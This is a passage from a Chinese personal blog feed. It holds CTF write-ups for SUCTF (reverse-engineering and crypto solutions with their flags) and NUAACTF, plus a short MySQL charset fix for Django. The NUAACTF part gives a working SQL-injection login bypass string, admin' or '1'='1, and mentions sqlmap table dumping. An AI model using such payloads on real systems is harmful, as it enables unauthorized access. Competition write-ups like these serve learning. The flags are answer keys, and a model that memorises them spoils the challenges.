<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 14 45 50 d8 e3 f9 07 bf c7 â€¦</div></pre></td></tr></table></figure>
<p>çœŸæ˜¯ä¸§å¿ƒç—…ç‹‚ï¼ŒæŠŠå­—èŠ‚æ‹†å‡ºæ¥å†™åˆ°æ–‡æœ¬æ–‡ä»¶é‡ŒğŸ˜‚  å†™ä¸ªç¨‹åºè½¬ä¸€ä¸‹ã€‚è½¬å‡ºæ¥å°±ä¸çŸ¥é“å¹²ä»€ä¹ˆäº†â€¦ æ„Ÿè§‰æ˜¯ä¸ªæ–‡ä»¶å¤´ï¼Œä½†æ˜¯ä½ è¿™ä¸ªæ–‡ä»¶å¤´å…¨è¢« 00 åˆ·æ‰äº†ï¼Ÿè¿™å°¼ç›æ€ä¹ˆä¿®ğŸŒš<br>
ç„¶åçº¿ç´¢å°±æ–­äº†ã€‚</p>
<h1 id="re">Re</h1>
<h2 id="-6">å…ˆåˆ©å…¶å™¨</h2>
<p>ä¸‹è½½ä¸€ä¸ª<a href="/suctf/use_of_ida.exe">æ–‡ä»¶</a>ã€‚<br>
æ‹–è¿› IDAï¼Œæ‰¾åˆ°ä¸¤æ®µä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ...</span></div><div class="line"><span class="keyword">if</span> ( num &gt; <span class="number">9</span> ) &#123;</div><div class="line">    plaintext = <span class="string">'I'</span>;</div><div class="line">    flag(&amp;plaintext);</div><div class="line">&#125;</div><div class="line"><span class="comment">// ...</span></div><div class="line"></div><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> *ret)</span> </span>&#123;</div><div class="line">    ret[<span class="number">12</span>] = <span class="string">'a'</span>;</div><div class="line">    ret[<span class="number">11</span>] = <span class="string">'6'</span>;</div><div class="line">    ret[<span class="number">10</span>] = <span class="string">'I'</span>;</div><div class="line">    ret[<span class="number">9</span>] = <span class="string">'_'</span>;</div><div class="line">    ret[<span class="number">8</span>] = <span class="string">'e'</span>;</div><div class="line">    ret[<span class="number">7</span>] = <span class="string">'5'</span>;</div><div class="line">    ret[<span class="number">6</span>] = <span class="string">'U'</span>;</div><div class="line">    ret[<span class="number">5</span>] = <span class="string">'_'</span>;</div><div class="line">    ret[<span class="number">4</span>] = <span class="string">'n'</span>;</div><div class="line">    ret[<span class="number">3</span>] = <span class="string">'@'</span>;</div><div class="line">    ret[<span class="number">2</span>] = <span class="string">'c'</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ç„¶åæ‹¼èµ·æ¥ï¼Œflag é‡Œè¿˜å·®ä¸ªä¸‹åˆ’çº¿ï¼Œæ²¡çœ‹ä»£ç ï¼ŒçŒœå‡ºæ¥äº†ï¼š<code>suctf{I_c@n_U5e_I6a}</code></p>
<h2 id="pe-format">PE_Format</h2>
<p><a href="/suctf/Do_you_know_pe.exe">æ–‡ä»¶</a>ã€‚<br>
ä¸æ‡‚ PE æ ¼å¼ï¼Œä¸‹ä¸‹æ¥ä»¥åçœ‹äº†åŠå¤©ã€‚åæ¥å‘ç°å‡ºé¢˜äººç«Ÿç„¶æŠŠ MZ å¤´å’Œ PE å¤´é‡Œçš„ <code>MZ</code> å’Œ <code>PE</code> ç»™è°ƒè¿‡æ¥äº†ğŸ˜‚ æ”¹æ­£åï¼ŒæŠŠ MZ å¤´ä¸­ PE å¤´çš„ä½ç½®ä» 0x40 æ”¹åˆ° 0x80, ç¨‹åºå°±èƒ½è·‘èµ·æ¥äº†ã€‚</p>
<p>æ‹–åˆ° IDA é‡Œåç¼–è¯‘ï¼Œç¨‹åºç«Ÿç„¶æ˜¯ç”¨ Cè‰¹ å†™çš„â€¦å•ƒä»£ç å•ƒä»£ç ï¼Œæœ€åå‘ç° flag è¢«æŒ‰ä½éäº†ï¼Œå†™ä¸ªç¨‹åºè§£å‡ºæ¥ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">// char secret[] = "Â»ÂÂ Â¦ÂÅ Â â€â€˜ÂË†Â Â¯ÂºÂ Â¹ÂÂâ€™Å¾â€¹Ã€";</span></div><div class="line"><span class="keyword">char</span> secret[] = <span class="string">"\xBB\x90\xA0\xA6\x90\x8A\xA0\x94\x91\x90\x88\xA0\xAF\xBA\xA0\xB9\x90\x8D\x92\x9E\x8B\xC0"</span>;</div><div class="line"><span class="keyword">char</span> v35[<span class="number">40</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> c;</div><div class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(secret);</div><div class="line">    <span class="built_in">memset</span>(v35, <span class="number">0</span>, <span class="number">30</span>);</div><div class="line">    <span class="built_in">strcpy</span>(v35, secret);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</div><div class="line">        v35[i] = ~v35[i];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, v35);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å¾—åˆ° flag: <code>suctf{Do_You_know_PE_Format?}</code>.</p>
<h2 id="find-correct-path">Find_correct_path</h2>
<p><a href="/suctf/Which_way_is_correct">æ–‡ä»¶</a>ã€‚</p>
<p>çœ‹æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+Ch] [bp-2Ch]@1</span></div><div class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+20h] [bp-18h]@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+28h] [bp-10h]@11</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v7 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>u);</div><div class="line">  __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048D40, &amp;v5);</div><div class="line">  <span class="keyword">if</span> ( v7 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( v7 )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">        choose1((<span class="keyword">int</span>)&amp;s);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">        choose2((<span class="keyword">int</span>)&amp;s);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">        choose3((<span class="keyword">int</span>)&amp;s);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">        choose4((<span class="keyword">int</span>)&amp;s);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    v6 = <span class="built_in">strlen</span>(&amp;s);</div><div class="line">    final((<span class="keyword">int</span>)&amp;s, v6);</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å‘ç°ç¨‹åºè¯»å…¥ v5 çš„å€¼ï¼Œåé¢å´åˆ¤æ–­äº† v7. æ‰”åˆ° Linux ä¸‹åŠ¨æ€è°ƒè¯•ã€‚</p>
<p>ä¸€å¼€å§‹è€æ˜¯æŠ¥ â€œNo such file or directoryâ€, åæ¥å‘ç°æ²¡æœ‰ <code>libc6</code> é“¾æ¥åº“ã€‚<br>
ç„¶åç”¨ gdbï¼Œåœ¨ v7 èµ‹å€¼åä¸‹æ–­ç‚¹ï¼Œæ”¹æ‰ v7 çš„å€¼ï¼Œç„¶åè®©ç¨‹åºç»§ç»­è¿è¡Œã€‚æœ€åå¾—åˆ° flag: <code>suctf{Thl5_way_ls_r!8ht}</code>.</p>
<p>çœ‹å°ä¼™ä¼´çš„ Writeup æ—¶ï¼Œå‘ç° IDA åç¼–è¯‘å‡ºçš„æºç æ˜¯å¯ä»¥åœ¨ Linux ä¸­ç¼–è¯‘çš„ï¼Œä»–ç›´æ¥æŠŠæºç é‡Œçš„ v5 æ”¹æˆ v7ï¼Œç„¶åç¼–è¯‘ä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚ç¥å¥‡ğŸ˜³</p>
<h2 id="reverse04">reverse04</h2>
<p><a href="/suctf/reverse03.exe">æ–‡ä»¶</a>ã€‚å°¼ç›ï¼Œä¸ºå•¥é¢˜ç›®æ˜¯ 04ï¼Œæ–‡ä»¶æ˜¯ 03â€¦</p>
<p>ç¨‹åºé‡Œç”¨äº†å„ç§ååŠ¨æ€è°ƒè¯•æŠ€æœ¯ï¼Œäºæ˜¯æˆ‘å°±é™æ€åˆ†æäº†ï¼Œåæ­£ä¹Ÿä¸ä¼šã€‚ç»“æœåˆ†æäº†åŠå¤©ï¼Œå„ç§ç®—åœ°å€ï¼Œæœ€åç®—å‡ºæ¥çš„ flag éƒ½æœ‰é—®é¢˜ï¼Œå°±æ”¾å¼ƒäº†â€¦<br>
æ®è¯´æˆ‘åªè·Ÿ flag å·®ä¸€ä¸ªå‡¯æ’’åŠ å¯†ï¼Ÿå™«ï¼Œé‚£å¤©çŠ¶æ€çœŸæ˜¯å·®ã€‚flag: <code>suctf{antidebugabc}</code>.</p>
<h1 id="crypto">Crypto</h1>
<h2 id="base">base??</h2>
<p><code>MMZVM2TEI5NDOU2WHB4GEM22NRMDCTRRMZIT2PI=</code> å…¨å¤§å†™ï¼Œæ ¹æ®é¢˜ç›®åˆ¤æ–­åº”è¯¥æ˜¯ base32. è§£å‡ºæ¥ä¸€æ®µ base64, å†è§£å¯†å¾—åˆ° flag: <code>suctf{I_1ove_Su}</code>.</p>
<h2 id="-7">å‡¯æ’’å¤§å¸</h2>
<p>OK, å‡¯æ’’å¯†ç ï¼Œæš´åŠ›æšä¸¾ä¸€ä¸‹ï¼Œæœ€åå‘ç°æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼èµ·æ¥ï¼Œèƒ½å¾—åˆ° <code>suctf{I_am_Cathar}</code>.<br>
ç„¶åè›‹ç–¼çš„åœ°æ–¹å°±æ¥äº†ã€‚é¼“æ£äº†ä¸€æ™šä¸Šï¼Œkey å„ç§é”™ï¼Œåæ¥åŒå­¦å‘Šè¯‰æˆ‘è¯´ï¼Œkey æ˜¯ <code>Caesar</code>â€¦ ç‰¹ä¹ˆç«Ÿç„¶æ˜¯æ•…æ„å†™é”™çš„ï¼Ÿ_(:Ğ·ã‚âˆ )_</p>
<h2 id="easyrsa">easyRSA</h2>
<p><a href="/suctf/easyRSA.rar">æ–‡ä»¶</a><br>
è§£å‡ºæ¥æ˜¯ RSA çš„å…¬é’¥å’ŒåŠ å¯†å†…å®¹ã€‚æ‰¾äº†ä¸ª <a href="http://ohroot.com/2016/07/11/rsa-in-ctf/" target="_blank" rel="external">Writeup</a>ï¼Œç…§ç€åšï¼Œåˆ†è§£è´¨å› æ•°ç”¨ <code>yafu</code> æå®šï¼Œæœ€åå¾—åˆ° flag: <code>suctf{Rsa_1s_ea5y}</code>.</p>
<h2 id="-8">æ™®è±è´¹å°”</h2>
<blockquote>
<p>C:prewglqkobbmxgkyzmvyml<br>
WW91IGFyZSBsdWNreQ==</p>
</blockquote>
<p>Playfair å¯†ç ã€‚å¯†é’¥æ˜¯åé¢é‚£ä¸ª base64 è§£å‡ºæ¥çš„ã€‚ç„¶è€Œï¼ŒPlayfair çš„åŠ å¯†çŸ©é˜µæ„é€ æ–¹å¼å¥½åƒæœ‰å¥½å¤šç§ï¼Œæ‰€ä»¥æ‰¾äº†å¥½å‡ ä¸ªåœ¨çº¿è§£å¯†ç½‘ç«™ï¼Œæœ€åæ‰¾åˆ° <a href="https://asecuritysite.com/coding/playfair" target="_blank" rel="external">è¿™ä¸ª</a>ï¼ŒæŠŠ flag è§£å‡ºæ¥äº†ï¼š<code>suctf{charleswheatstone}</code></p>
<h1 id="-9">æ€»ç»“ï¼ˆè¯´ç‚¹é—²è¯ï¼‰</h1>
<p>è¿™æ¬¡ CTF æ˜¯ä¸ªäººèµ›ï¼Œä¸ºæœŸä¸€å‘¨ï¼Œå¾ˆå¤šé¢˜éƒ½æ˜¯åœ¨å·¥ä½œæ—¥ä¸‹ç­ä¹‹åå®Œæˆçš„ï¼Œæ‰€ä»¥åšé¢˜çš„æ—¶å€™è€å¿ƒå°‘äº†ä¸€ç‚¹ï¼Œå¾ˆå¤šé¢˜åŠå¤©æ²¡åšå‡ºæ¥å°±æ”¾å¼ƒäº†ï¼ˆæ¯”å¦‚ Android Studio é‚£é“é¢˜ï¼‰ã€‚</p>
<p>åšå®¢åˆå¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œä¸ƒæœˆåˆ°åä¸€æœˆåœ¨å®ä¹ ï¼Œæ¯å¤©æ²‰è¿·å·¥(yu)ä½œ(le)ï¼Œæ²¡æœ‰ä»€ä¹ˆå¿ƒæ€å»å­¦ä¹ ã€å»æé«˜ã€‚ç°åœ¨å®ä¹ ç»“æŸäº†ï¼Œå´æ¬ äº†ä¸€å †ä½œä¸šæ²¡åšã€‚ç­‰æˆ‘æŠŠä½œä¸šéƒ½åšå®Œï¼Œå†æ¥æ›´æ–°å§ã€‚<br>
å¤§æ¦‚ä¼šå†™ä¸€ç¯‡ Django REST Framework çš„å…¥é—¨æŒ‡å—ï¼ŸğŸ˜³</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆç©äº†ä¸€åœº CTFï¼Œè™½ç„¶æ˜¯ä¸ªäººèµ›ï¼Œä½†æ˜¯æœ‰è€å¸æœºå¸¦æˆ‘é£ã€‚ç»§ç»­å¼€è„‘æ´ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ï¼Œåšäº†å¾ˆå¤šä¹‹å‰æ²¡åšè¿‡çš„é¢˜ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="ä¹±ä¸ƒå…«ç³Ÿ" scheme="//blog.stdioa.com/categories/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="CTF" scheme="//blog.stdioa.com/tags/CTF/"/>
    
      <category term="è„‘æ´" scheme="//blog.stdioa.com/tags/%E8%84%91%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>è§£å†³ MySQL ç¼–ç é—®é¢˜</title>
    <link href="//blog.stdioa.com/2016/05/django-mysql-charset-problem/"/>
    <id>//blog.stdioa.com/2016/05/django-mysql-charset-problem/</id>
    <published>2016-05-09T01:40:46.000Z</published>
    <updated>2016-11-08T14:12:03.796Z</updated>
    
    <content type="html"><![CDATA[<p>å¾ˆä¹…ä»¥å‰å†™äº†ä¸€ä¸ª Django é¡¹ç›®ï¼Œæ•°æ®åº“ç”¨çš„ MySQL. å¾ˆä¹…æ²¡ç”¨ï¼Œåæ¥å‘ç° MySQL ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å…¨éƒ¨å˜æˆäº†é—®å·ã€‚</p>
<a id="more"></a>
<h1 id="1-mysql">1. è®¾ç½® MySQL æœåŠ¡ç«¯é»˜è®¤å­—ç¬¦é›†</h1>
<p>åœ¨ <code>my.cnf</code> ä¸­è®¾ç½®é»˜è®¤å­—ç¬¦é›†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[mysqld]</div><div class="line">character-set-server=utf8</div></pre></td></tr></table></figure>
<p>åŒæ—¶ï¼Œå¯ä»¥è®¾ç½® MySQL å®¢æˆ·ç«¯çš„é»˜è®¤å­—ç¬¦é›†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[mysql]</div><div class="line">character-set-default=utf-8</div></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆåï¼Œé‡å¯ MySQL æœåŠ¡ï¼Œè¾“å…¥ <code>SHOW VARIABLES LIKE '%CHAR';</code> æ£€æŸ¥å­—ç¬¦é›†æ˜¯å¦æ­£ç¡®ã€‚</p>
<h1 id="2">2. æ‰‹åŠ¨è®¾ç½®æ•°æ®åº“ç¼–ç </h1>
<p>ä¿®æ”¹é»˜è®¤ç¼–ç å…¶å®æ˜¯æ²¡ç”¨çš„ğŸ˜‚ï¼Œè¿˜éœ€è¦æ‰‹åŠ¨è®¾ç½®æ•°æ®åº“ç¼–ç ï¼Œè€Œæ•°æ®åº“ç¼–ç éœ€è¦åœ¨å»ºç«‹æ—¶æŒ‡å®šï¼Œæ‰€ä»¥â€¦çœŸæ˜¯ä¸€ä¸ªæ‚²ä¼¤çš„æ•…äº‹ğŸ˜¢ï¼ˆåæ­£æˆ‘çš„æœåŠ¡ä¹Ÿæ²¡äººç”¨</p>
<p>é‡æ–°å»ºç«‹æ•°æ®åº“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DROP DATABASE spaste;</div><div class="line">CREATE DATABASE spaste DEFAULT CHARACTER SET utf8;</div></pre></td></tr></table></figure>
<p>é‡å»ºæ•°æ®åº“åï¼Œè¾“å…¥ <code>python manager.py migrate</code> é‡æ–°è¿ç§»æ•°æ®åº“ã€‚</p>
<h1 id="3">3. å‚è€ƒèµ„æ–™</h1>
<ol>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/charset-applications.html" target="_blank" rel="external">Configuring the Character Set and Collation for Applications - MySQL 5.7 Reference Manual</a></li>
<li><a href="http://shikezhi.com/html/2015/mysql_0827/204288.html" target="_blank" rel="external">django è§£å†³ mysql æ•°æ®åº“è¾“å…¥ä¸­æ–‡ä¹±ç é—®é¢˜</a></li>
</ol>
<h1 id="4">4. åè®°</h1>
<p>å¥½çŸ­çš„ä¸€ç¯‡æ–‡ç« â€¦</p>
<p>æœ€è¿‘åœ¨çˆ¬ B ç«™ç”¨æˆ·çš„å…¬å¼€ç”¨æˆ·æ•°æ®ï¼Œæ•°æ®åº“ç”¨äº† MongoDB, çˆ¬å®Œä»¥åå¥½å¥½ç©ä¸€ç©ğŸ˜³<br>
B ç«™åŸºä½¬å¥½å¤šå•Š_(:Ğ·ã‚âˆ )_</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¾ˆä¹…ä»¥å‰å†™äº†ä¸€ä¸ª Django é¡¹ç›®ï¼Œæ•°æ®åº“ç”¨çš„ MySQL. å¾ˆä¹…æ²¡ç”¨ï¼Œåæ¥å‘ç° MySQL ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å…¨éƒ¨å˜æˆäº†é—®å·ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="å¼€å‘" scheme="//blog.stdioa.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="MySQL" scheme="//blog.stdioa.com/tags/MySQL/"/>
    
      <category term="Django" scheme="//blog.stdioa.com/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬ä¸€å±Š NUAACTF éå®˜æ–¹ Writeup</title>
    <link href="//blog.stdioa.com/2016/04/nuaactf-unofficial-writeup/"/>
    <id>//blog.stdioa.com/2016/04/nuaactf-unofficial-writeup/</id>
    <published>2016-04-25T04:01:04.000Z</published>
    <updated>2016-11-08T13:48:35.546Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦æ ¡ç»„ç»‡äº†ç¬¬ä¸€å±Š NUAACTFï¼Œå‚åŠ å»ç©ç©ï¼Œå¼€å¼€è„‘æ´ğŸ˜‚ï¼Œå—¯ï¼Œè¿˜è›®å¥½ç©çš„~</p>
<a id="more"></a>
<h1 id="web-0">Web 0</h1>
<p><strong>huanâ€™yingâ€™laiâ€™dao</strong></p>
<p>ç­¾åˆ°é¢˜ï¼ŒF12 å³å¯å¾—åˆ° flag.
Flag è—åœ¨é¡µé¢çš„æŸä¸ª <code>js</code> æ–‡ä»¶é‡Œï¼Œç”¨ jsfuck æ··æ·†äº†ã€‚</p>
<h1 id="web-1">Web 1</h1>
<p><strong>ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“</strong></p>
<p>é¢˜ç›®è²Œä¼¼æ”¹è¿‡ä¸€å›ã€‚</p>
<p>æ”¹ä¹‹å‰ç›´æ¥ç‚¹å‡»ç½‘é¡µä¸Šçš„ä¸€ä¸ªé“¾æ¥ï¼Œè·³è½¬åˆ°æŸä¸ªç½‘é¡µï¼Œæºä»£ç é‡Œé¢æœ‰ä¸€æ®µ phpï¼Œå…·ä½“å†…å®¹ä¸è®°å¾—äº†ï¼Œé‡Œé¢
æœ‰ä¸€ä¸² MD5 <code>095a655fc809cbbdffa207717a5233f5</code>. Google ä¸€ä¸‹æ‰¾åˆ°æŸç™½èœçš„åšå®¢ï¼Œå¾—åˆ°åŸæ–‡ <code>bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE</code>.<br>
çœ‹èµ·æ¥åƒ <code>Base64</code>ï¼Œäºæ˜¯ decode ä¸€ä¸‹ï¼Œç„¶å <code>decodeURIComponents</code> å¾—åˆ° flag.</p>
<p>åæ¥é¢˜ç›®æ”¹äº†ï¼Œç›´æ¥æŒ‰ç…§é¢˜ç›®è¦æ±‚å»ç™¾åº¦å°±èƒ½ç›´æ¥æ‰¾åˆ°æŸç™½èœçš„åšå®¢ã€‚</p>
<h1 id="web-2">Web 2</h1>
<p><strong>ä¸æ˜¯ bug æ˜¯ feature</strong></p>
<p>Web 2 çš„å…¥å£ç‚¹åœ¨ Web 1 çš„ flag é‡Œã€‚è¿›å»ä»¥åä¼šè·³è½¬åˆ°æŸä¸ª php, ç„¶è€ŒæŸç™½èœåˆæŠŠ php æºç å†™è¿›å»äº†ï¼Œæ€è·¯è·Ÿä¸Šä¸ªé¢˜å¥½åƒä¸€æ ·ï¼Œä¹Ÿæ˜¯å»ç™¾åº¦ä¸€ä¸‹ MD5 å¾—åˆ°å¯†ç ï¼Œæ·»åŠ  <code>GET</code> å‚æ•°å³å¯æ‹¿åˆ° flag.</p>
<h1 id="web-3">Web 3</h1>
<p><strong>ç¬¨ç¬¨çš„ç¨‹åºçŒ¿</strong></p>
<p>Web 3 çš„å…¥å£ç‚¹åœ¨ Web 2 çš„ flag é‡Œã€‚è¿›å»ä»¥åè·³è½¬åˆ°æŸ php, é‡Œé¢åªæœ‰ä¸€ä¸ªç™»å½•è¡¨å•ã€‚çœ‹èµ·æ¥åƒæ˜¯ SQL æ³¨å…¥ï¼Œå°±ç”¨ <code>sqlmap</code> æ‰«äº†ä¸€ä¸‹ï¼ŒæŠŠè¡¨ dump å‡ºæ¥ï¼Œå‘ç°æœ‰ä¸¤ä¸ªè´¦æˆ· admin å’Œ userï¼Œå¯†ç éƒ½æ˜¯ä¸€å¨çœ‹èµ·æ¥ä»€ä¹ˆéƒ½ä¸åƒçš„ä¸œè¥¿ï¼Œç„¶åçº¿ç´¢å°±æ–­äº†ã€‚<br>
æœ€åä¸€ä¸ªå°æ—¶å†³å®šæ‰‹åŠ¨æ³¨å…¥ä¸€ä¸‹ï¼Œç„¶è€Œå¹¶ä¸æ€ä¹ˆä¼š SQL æ³¨å…¥äºæ˜¯å°±æ‰¾äº†å‡ ç¯‡åšå®¢æ¥çœ‹ã€‚æ³¨å…¥äº†åŠå¤©å¯†ç æ¡†å‡æ— æœï¼Œæœ€åè¯•äº†ä¸€ä¸‹æ³¨å…¥ç”¨æˆ·åè¾“å…¥æ¡† <code>admin' or '1'='1</code>ï¼ŒæˆåŠŸç™»å½•ã€‚<br>
ç™»å½•ä»¥å flag ä¸€é—ªè€Œè¿‡ï¼Œæœ¬æ¥æƒ³æˆªå±ç„¶è€Œæ‡’å¾—æˆªäº†å°±æŠ“äº†åŒ…ï¼Œæ‹¿åˆ° flag.</p>
<h1 id="web-4">Web 4 (æœªè§£å‡º)</h1>
<p><strong>ä½ ä»å“ªé‡Œæ¥ï¼Œæˆ‘çš„æœ‹å‹ã€‚</strong></p>
<p>Web 3 æˆåŠŸç™»å½•åå°±è·³è½¬åˆ° Web 4ï¼Œç½‘é¡µå†™ç€&quot;0nly welc0me pe0ple who c0me from <a href="http://cs.nuaa.edu.cn" target="_blank" rel="external">http://cs.nuaa.edu.cn</a> &quot;ã€‚ç»“åˆâ€œä½ ä»å“ªé‡Œæ¥â€ï¼Œæƒ³åˆ°äº†è¯·æ±‚æ¥æºï¼Œä½†æ˜¯æˆ‘åªæƒ³åˆ°äº† <code>Referer</code>, ä¿®æ”¹åæ— æœã€‚<br>
æ¯”èµ›ç»“æŸåå¬è¯´è¦æ”¹ <code>Origin</code> å’Œ <code>X-Forwarded-For</code>, ç„¶è€Œæ”¹äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ã€‚</p>
<h1 id="rev-1">Rev 1</h1>
<p><strong>æ›¾è€å¸ˆçš„ Android è¯¾</strong></p>
<p>æŠŠ apk ä¸‹è½½ä¸‹æ¥ï¼Œç”¨ <code>jd-gui</code> æ‰“å¼€ï¼Œä¸€é˜µä¹±ç¿»ä»¥åå‘ç° flag è—åœ¨ <code>MainActivity.class</code> é‡Œã€‚</p>
<h1 id="rev-2">Rev 2 (æœªè§£å‡º)</h1>
<p><strong>å¥‡å¦™çš„å£°éŸ³</strong></p>
<p>åˆçœ‹è§å®‰å“äº†ï¼Œä¸‹ä¸‹æ¥ä»¥åä¸€é˜µä¹±ç¿»ï¼Œæ²¡æœ‰å¤´ç»ªã€‚</p>
<p>åˆšæ‰çœ‹äº†åˆ«äººçš„é¢˜è§£ï¼Œå‘ç° flag åœ¨èµ„æºç›®å½•é‡Œé¢ã€‚<br>
æ‹¿å‡ºæ¥ <code>res/raw/sound.wav</code>, ç”¨éšä¾¿ä»€ä¹ˆé¬¼æ‰“å¼€ï¼ˆæ¥ä¹‹å‰è§è¯†è¿‡è¿™ä¸ªè„‘æ´ï¼Œä¸“é—¨å‡†å¤‡çš„ Sonic Visualiser, ç„¶è€Œå¡ä½äº†æ²¡æœ‰ç”¨ä¸Šï¼‰ï¼Œå‘ç°é‡Œé¢æœ‰å››ä¸ªå£°é“ï¼Œä¸‹é¢ä¸¤ä¸ªå£°é“åƒæ˜¯ä¸ªæ–¹æ³¢ã€‚</p>
